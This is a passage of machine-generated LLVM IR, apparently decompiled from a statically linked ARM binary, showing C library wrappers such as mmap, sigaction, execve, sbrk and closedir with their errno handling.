  store i32 %v4_15080, i32* %r3.global-to-local, align 4
  %v0_15084 = load i32, i32* @r7, align 4
  store i32 %v0_15084, i32* %r1.global-to-local, align 4
  %v1_15088 = inttoptr i32 %v4_15080 to i32*
  %v2_15088 = load i32, i32* %v1_15088, align 4
  store i32 %v2_15088, i32* %r2.global-to-local, align 4
  %v0_1508c = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_15098 = trunc i32 %v0_1508c to i16
  %v2_15098 = call i32 @__GI_exit(i16 %v1_15098)
  %v0_1509c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1509c, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_1507c
  %v1_1509c = load i32, i32* %r1.global-to-local, align 4
  %v8_1509c = shl i32 %v2_15098, %arg1
  %v9_1509c = and i32 %v1_1509c, %v8_1509c
  store i32 %v9_1509c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1507c, %bb66
  %v4_150bc = phi i32 [ %v2_15098, %dec_label_pc_1507c ], [ 0, %bb66 ]
  ret i32 %v4_150bc

; uselistorder directives
  uselistorder i32 %v0_15038.pre, { 1, 0 }
  uselistorder i32 %v1_1502c, { 1, 0 }
  uselistorder i32 %v1_15028, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14fec, { 1, 0 }
  uselistorder i32 %v1_14fe8, { 1, 2, 3, 0 }
  uselistorder i32 %v4_14fa0, { 1, 0, 2 }
  uselistorder i1 %v8_14ee8, { 1, 2, 0 }
  uselistorder i32 %v2_14eb8, { 1, 2, 0 }
  uselistorder i32 %v1_14eb4, { 1, 2, 0 }
  uselistorder i1 %v2_14ea0, { 1, 0 }
  uselistorder i32 %v4_14e84, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v3_14e20, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 6, 5, 0, 1, 3, 2, 4, 8, 7, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 1, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 9, 0, 10, 6, 1, 7, 8, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 (i16)* @__GI_exit, { 6, 0, 1, 3, 2, 4, 5 }
  uselistorder i32 47, { 0, 2, 1 }
  uselistorder i32 32770, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1507c, { 1, 0 }
  uselistorder label %dec_label_pc_15058, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14f68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f44, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_14eb8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_14ea0, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_150dc = load i32, i32* @r4, align 4
  store i32 %v3_150dc, i32* %stack_var_-16, align 4
  %v3_150e8 = urem i32 %arg3, 4096
  %v2_150ec = icmp eq i32 %v3_150e8, 0
  br i1 %v2_150ec, label %dec_label_pc_15108, label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %entry
  %v0_150f4 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15100 = inttoptr i32 %v0_150f4 to i32*
  store i32 22, i32* %v2_15100, align 4
  %v0_15138.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15138

dec_label_pc_15108:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15134, label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_15108
  %v0_15124 = call i32 @__GI___errno_location()
  %v0_15128 = load i32, i32* %r4.global-to-local, align 4
  %v1_15128 = sub i32 0, %v0_15128
  %v2_1512c = inttoptr i32 %v0_15124 to i32*
  store i32 %v1_15128, i32* %v2_1512c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15134

dec_label_pc_15134:                               ; preds = %dec_label_pc_15108, %dec_label_pc_15124
  %v0_15134 = phi i32 [ %arg1, %dec_label_pc_15108 ], [ -1, %dec_label_pc_15124 ]
  store i32 %v0_15134, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_150f4, %dec_label_pc_15134
  %v0_15138 = phi i32 [ %v0_15138.pre, %dec_label_pc_150f4 ], [ %v0_15134, %dec_label_pc_15134 ]
  %v2_1513c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1513c, i32* @r4, align 4
  ret i32 %v0_15138

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15138, { 1, 0 }
  uselistorder label %dec_label_pc_15134, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_15144 = load i32, i32* @r4, align 4
  store i32 %v3_15144, i32* %stack_var_-8, align 4
  %v0_15148 = load i32, i32* @r0, align 4
  %v0_1514c = call i32 @__GI___errno_location()
  %v1_15150 = sub i32 0, %v0_15148
  %v2_15154 = inttoptr i32 %v0_1514c to i32*
  store i32 %v1_15150, i32* %v2_15154, align 4
  %v2_1515c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1515c, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15164 = load i32, i32* @r4, align 4
  %v6_15164 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1516c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1516c, label %dec_label_pc_151c0, label %dec_label_pc_15184

dec_label_pc_15184:                               ; preds = %entry
  %v1_15184 = add i32 %arg2, 4
  %v2_15184 = inttoptr i32 %v1_15184 to i32*
  %v3_15184 = load i32, i32* %v2_15184, align 4
  store i32 %v3_15184, i32* @r3, align 4
  %v1_15188 = and i32 %v3_15184, 67108864
  %v2_15188 = icmp eq i32 %v1_15188, 0
  br i1 %v2_15188, label %dec_label_pc_15190, label %dec_label_pc_151c0

dec_label_pc_15190:                               ; preds = %dec_label_pc_15184
  store i32 20, i32* @r2, align 4
  %v2_15194 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15194, i32* @r0, align 4
  %v0_15198 = call i32 @memcpy()
  %v0_151c0.pre = load i32, i32* @r5, align 4
  %v0_151c8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151c0

dec_label_pc_151c0:                               ; preds = %dec_label_pc_15184, %entry, %dec_label_pc_15190
  %v0_151c8 = phi i32 [ %arg3, %dec_label_pc_15184 ], [ %arg3, %entry ], [ %v0_151c8.pre, %dec_label_pc_15190 ]
  %v0_151c4 = phi i32 [ %arg2, %dec_label_pc_15184 ], [ 0, %entry ], [ %v2_15194, %dec_label_pc_15190 ]
  %v0_151c0 = phi i32 [ %arg1, %dec_label_pc_15184 ], [ %arg1, %entry ], [ %v0_151c0.pre, %dec_label_pc_15190 ]
  %v4_151d0 = call i32 @__syscall_rt_sigaction(i32 %v0_151c0, i32 %v0_151c4, i32 %v0_151c8, i32 8)
  store i32 %v3_15164, i32* @r4, align 4
  store i32 %v6_15164, i32* @r5, align 4
  ret i32 %v4_151d0

; uselistorder directives
  uselistorder label %dec_label_pc_151c0, { 2, 0, 1 }
}

define i32 @function_151e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_151e4:
  %v0_151e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_151e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_151e4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_151e4, %bb
  %v0_151ec = phi i32 [ %arg1, %dec_label_pc_151e4 ], [ 0, %bb ]
  ret i32 %v0_151ec

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_15200 = load i32, i32* @r0, align 4
  ret i32 %v0_15200
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15204 = load i32, i32* @r7, align 4
  store i32 %v3_15204, i32* %stack_var_-8, align 4
  %v0_15210 = load i32, i32* @r0, align 4
  store i32 %v0_15210, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15210, -4095
  br i1 %tmp, label %dec_label_pc_1522c, label %dec_label_pc_1521c

dec_label_pc_1521c:                               ; preds = %entry
  %v0_1521c = call i32 @__GI___errno_location()
  %v0_15220 = load i32, i32* %r7.global-to-local, align 4
  %v1_15220 = sub i32 0, %v0_15220
  %v2_15224 = inttoptr i32 %v0_1521c to i32*
  store i32 %v1_15220, i32* %v2_15224, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15230.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1522c

dec_label_pc_1522c:                               ; preds = %entry, %dec_label_pc_1521c
  %v2_15230 = phi i32 [ %v3_15204, %entry ], [ %v2_15230.pre, %dec_label_pc_1521c ]
  %v0_1522c = phi i32 [ %v0_15210, %entry ], [ -1, %dec_label_pc_1521c ]
  store i32 %v2_15230, i32* @r7, align 4
  ret i32 %v0_1522c

; uselistorder directives
  uselistorder i32 %v0_15210, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1522c, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15238 = load i32, i32* @r7, align 4
  store i32 %v3_15238, i32* %stack_var_-8, align 4
  %v0_15244 = load i32, i32* @r0, align 4
  store i32 %v0_15244, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15244, -4095
  br i1 %tmp, label %dec_label_pc_15264, label %dec_label_pc_15254

dec_label_pc_15254:                               ; preds = %entry
  %v0_15254 = call i32 @__GI___errno_location()
  %v0_15258 = load i32, i32* %r7.global-to-local, align 4
  %v1_15258 = sub i32 0, %v0_15258
  %v2_1525c = inttoptr i32 %v0_15254 to i32*
  store i32 %v1_15258, i32* %v2_1525c, align 4
  %v2_15264.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15264

dec_label_pc_15264:                               ; preds = %entry, %dec_label_pc_15254
  %v1_15268 = phi i32 [ %v0_15244, %entry ], [ -1, %dec_label_pc_15254 ]
  %v2_15264 = phi i32 [ %v3_15238, %entry ], [ %v2_15264.pre, %dec_label_pc_15254 ]
  store i32 %v2_15264, i32* %r7.global-to-local, align 4
  ret i32 %v1_15268

; uselistorder directives
  uselistorder i32 %v0_15244, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15264, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_1527c = load i32, i32* @r0, align 4
  ret i32 %v1_1527c
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15280 = load i32, i32* @r7, align 4
  store i32 %v3_15280, i32* %stack_var_-8, align 4
  %v0_1528c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1528c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1528c, -4095
  br i1 %tmp, label %dec_label_pc_152ac, label %dec_label_pc_1529c

dec_label_pc_1529c:                               ; preds = %entry
  %v0_1529c = call i32 @__GI___errno_location()
  %v0_152a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_152a0 = sub i32 0, %v0_152a0
  %v2_152a4 = inttoptr i32 %v0_1529c to i32*
  store i32 %v1_152a0, i32* %v2_152a4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_152ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %entry, %dec_label_pc_1529c
  %v1_152b0 = phi i32 [ %v0_1528c, %entry ], [ -1, %dec_label_pc_1529c ]
  %v2_152ac = phi i32 [ %v3_15280, %entry ], [ %v2_152ac.pre, %dec_label_pc_1529c ]
  store i32 %v2_152ac, i32* %r7.global-to-local, align 4
  ret i32 %v1_152b0

; uselistorder directives
  uselistorder i32 %v0_1528c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_152ac, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_152b4 = load i32, i32* @r7, align 4
  store i32 %v3_152b4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_152dc, label %dec_label_pc_152cc

dec_label_pc_152cc:                               ; preds = %entry
  %v0_152cc = call i32 @__GI___errno_location()
  %v0_152d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_152d0 = sub i32 0, %v0_152d0
  %v2_152d4 = inttoptr i32 %v0_152cc to i32*
  store i32 %v1_152d0, i32* %v2_152d4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_152e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_152dc

dec_label_pc_152dc:                               ; preds = %entry, %dec_label_pc_152cc
  %v2_152e0 = phi i32 [ %v3_152b4, %entry ], [ %v2_152e0.pre, %dec_label_pc_152cc ]
  %v0_152dc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_152cc ]
  store i32 %v2_152e0, i32* @r7, align 4
  ret i32 %v0_152dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152dc, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_152f8 = load i32, i32* @r0, align 4
  ret i32 %v1_152f8
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1530c = load i32, i32* @r0, align 4
  ret i32 %v1_1530c
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15310 = load i32, i32* @r4, align 4
  store i32 %v3_15310, i32* %stack_var_-16, align 4
  store i32 27612, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r4.global-to-local, align 4
  %v4_15320 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27612) to i32*), align 4
  %v2_15324 = icmp eq i32 %v4_15320, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15324, label %dec_label_pc_15330, label %dec_label_pc_15340

dec_label_pc_15330:                               ; preds = %entry
  %v1_15334 = call i32 @__GI_brk(i32 0)
  %v1_15338 = icmp slt i32 %v1_15334, 0
  br i1 %v1_15338, label %dec_label_pc_15364, label %dec_label_pc_15340thread-pre-split

dec_label_pc_15340thread-pre-split:               ; preds = %dec_label_pc_15330
  %v0_15344.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_15340.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15340.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15340

dec_label_pc_15340:                               ; preds = %dec_label_pc_15340thread-pre-split, %entry
  %v1_15340 = phi i32 [ %v1_15340.pre, %dec_label_pc_15340thread-pre-split ], [ 27612, %entry ]
  %v0_15340 = phi i32 [ %v0_15340.pre, %dec_label_pc_15340thread-pre-split ], [ ptrtoint (i32* @global_var_26934.581 to i32), %entry ]
  %v1_15354 = phi i32 [ %v0_15344.pr, %dec_label_pc_15340thread-pre-split ], [ %arg1, %entry ]
  %v2_15340 = add i32 %v0_15340, %v1_15340
  %v3_15340 = inttoptr i32 %v2_15340 to i32*
  %v4_15340 = load i32, i32* %v3_15340, align 4
  %v2_15344 = icmp eq i32 %v1_15354, 0
  store i32 %v4_15340, i32* %r4.global-to-local, align 4
  br i1 %v2_15344, label %dec_label_pc_15368, label %dec_label_pc_15350

dec_label_pc_15350:                               ; preds = %dec_label_pc_15340
  %v2_15354 = add i32 %v4_15340, %v1_15354
  %v1_15358 = call i32 @__GI_brk(i32 %v2_15354)
  %v1_1535c = icmp slt i32 %v1_15358, 0
  br i1 %v1_1535c, label %dec_label_pc_15364, label %dec_label_pc_15350.dec_label_pc_15368_crit_edge

dec_label_pc_15350.dec_label_pc_15368_crit_edge:  ; preds = %dec_label_pc_15350
  %v0_15368.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15368

dec_label_pc_15364:                               ; preds = %dec_label_pc_15350, %dec_label_pc_15330
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15368

dec_label_pc_15368:                               ; preds = %dec_label_pc_15340, %dec_label_pc_15350.dec_label_pc_15368_crit_edge, %dec_label_pc_15364
  %v0_15368 = phi i32 [ %v0_15368.pre, %dec_label_pc_15350.dec_label_pc_15368_crit_edge ], [ -1, %dec_label_pc_15364 ], [ %v4_15340, %dec_label_pc_15340 ]
  %v2_1536c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1536c, i32* @r4, align 4
  ret i32 %v0_15368

; uselistorder directives
  uselistorder i32 %v4_15340, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_15368, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1538c = load i32, i32* @r0, align 4
  ret i32 %v1_1538c
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15390 = load i32, i32* @r7, align 4
  store i32 %v3_15390, i32* %stack_var_-8, align 4
  %v0_1539c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1539c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1539c, -4095
  br i1 %tmp, label %dec_label_pc_153bc, label %dec_label_pc_153ac

dec_label_pc_153ac:                               ; preds = %entry
  %v0_153ac = call i32 @__GI___errno_location()
  %v0_153b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_153b0 = sub i32 0, %v0_153b0
  %v2_153b4 = inttoptr i32 %v0_153ac to i32*
  store i32 %v1_153b0, i32* %v2_153b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_153bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %entry, %dec_label_pc_153ac
  %v1_153c0 = phi i32 [ %v0_1539c, %entry ], [ -1, %dec_label_pc_153ac ]
  %v2_153bc = phi i32 [ %v3_15390, %entry ], [ %v2_153bc.pre, %dec_label_pc_153ac ]
  store i32 %v2_153bc, i32* @r7, align 4
  ret i32 %v1_153c0

; uselistorder directives
  uselistorder i32 %v0_1539c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_153bc, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_153c4 = load i32, i32* @r7, align 4
  store i32 %v3_153c4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_153ec, label %dec_label_pc_153dc

dec_label_pc_153dc:                               ; preds = %entry
  %v0_153dc = call i32 @__GI___errno_location()
  %v0_153e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_153e0 = sub i32 0, %v0_153e0
  %v2_153e4 = inttoptr i32 %v0_153dc to i32*
  store i32 %v1_153e0, i32* %v2_153e4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_153f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153ec

dec_label_pc_153ec:                               ; preds = %entry, %dec_label_pc_153dc
  %v2_153f0 = phi i32 [ %v3_153c4, %entry ], [ %v2_153f0.pre, %dec_label_pc_153dc ]
  %v0_153ec = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_153dc ]
  store i32 %v2_153f0, i32* @r7, align 4
  ret i32 %v0_153ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153ec, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1542c, label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %entry
  %v0_1541c = call i32 @__GI___errno_location()
  %v0_15420 = load i32, i32* %r4.global-to-local, align 4
  %v1_15420 = sub i32 0, %v0_15420
  %v2_15424 = inttoptr i32 %v0_1541c to i32*
  store i32 %v1_15420, i32* %v2_15424, align 4
  br label %dec_label_pc_1542c

dec_label_pc_1542c:                               ; preds = %entry, %dec_label_pc_1541c
  %v1_15434 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1541c ]
  ret i32 %v1_15434

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1542c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15438 = load i32, i32* @r7, align 4
  store i32 %v3_15438, i32* %stack_var_-8, align 4
  %v0_15444 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15444, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15444, -4095
  br i1 %tmp, label %dec_label_pc_15464, label %dec_label_pc_15454

dec_label_pc_15454:                               ; preds = %entry
  %v0_15454 = call i32 @__GI___errno_location()
  %v0_15458 = load i32, i32* %r7.global-to-local, align 4
  %v1_15458 = sub i32 0, %v0_15458
  %v2_1545c = inttoptr i32 %v0_15454 to i32*
  store i32 %v1_15458, i32* %v2_1545c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15464.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %entry, %dec_label_pc_15454
  %v1_15468 = phi i32 [ %v0_15444, %entry ], [ -1, %dec_label_pc_15454 ]
  %v2_15464 = phi i32 [ %v3_15438, %entry ], [ %v2_15464.pre, %dec_label_pc_15454 ]
  store i32 %v2_15464, i32* @r7, align 4
  ret i32 %v1_15468

; uselistorder directives
  uselistorder i32 %v0_15444, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15464, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1546c = load i32, i32* @r4, align 4
  store i32 %v3_1546c, i32* %stack_var_-24, align 4
  %v2_15470 = load i32, i32* %arg1, align 4
  store i32 %v2_15470, i32* %r4.global-to-local, align 4
  %v3_15478 = icmp eq i32 %v2_15470, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r6, align 4
  br i1 %v3_15478, label %dec_label_pc_1548c, label %dec_label_pc_154a0

dec_label_pc_1548c:                               ; preds = %entry
  %v0_1548c = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_15494 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15494, i32* %r2.global-to-local, align 4
  %v2_15498 = inttoptr i32 %v0_1548c to i32*
  store i32 9, i32* %v2_15498, align 4
  %v0_15540.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15540

dec_label_pc_154a0:                               ; preds = %entry
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_154a4 = add i32 %tmp, 24
  store i32 %v1_154a4, i32* %r4.global-to-local, align 4
  store i32 %v1_154a4, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_154b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_154b8)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_154d0 = load i32, i32* @r6, align 4
  %v2_154d0 = add i32 %v0_154d0, 16
  %v3_154d0 = inttoptr i32 %v2_154d0 to i32*
  %v4_154d0 = load i32, i32* %v3_154d0, align 4
  call void @__pseudo_branch(i32 %v4_154d0)
  %v0_154dc = load i32, i32* @r7, align 4
  %v1_154dc = inttoptr i32 %v0_154dc to i32*
  %v2_154dc = load i32, i32* %v1_154dc, align 4
  store i32 %v2_154dc, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_154ec = load i32, i32* @r8, align 4
  store i32 %v0_154ec, i32* %v1_154dc, align 4
  %v0_154f0 = load i32, i32* @r6, align 4
  %v1_154f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_154f0 = add i32 %v1_154f0, %v0_154f0
  %v3_154f0 = inttoptr i32 %v2_154f0 to i32*
  %v4_154f0 = load i32, i32* %v3_154f0, align 4
  store i32 ptrtoint (i32* @global_var_154fc.868 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_154f0)
  %v0_154fc = load i32, i32* @r7, align 4
  %v1_154fc = add i32 %v0_154fc, 12
  %v2_154fc = inttoptr i32 %v1_154fc to i32*
  %v3_154fc = load i32, i32* %v2_154fc, align 4
  store i32 %v3_154fc, i32* @r0, align 4
  %v0_15500 = call i32 @free()
  %v0_15504 = load i32, i32* @r7, align 4
  store i32 %v0_15504, i32* @r0, align 4
  %v0_15508 = call i32 @free()
  %v0_15510 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_15510, -4095
  br i1 %tmp11, label %dec_label_pc_1553c, label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_154a0
  %v0_1552c = call i32 @__GI___errno_location()
  %v0_15530 = load i32, i32* @r4, align 4
  %v1_15530 = sub i32 0, %v0_15530
  store i32 %v1_15530, i32* %r3.global-to-local, align 4
  %v2_15534 = inttoptr i32 %v0_1552c to i32*
  store i32 %v1_15530, i32* %v2_15534, align 4
  %v0_15538 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_154a0, %dec_label_pc_1552c
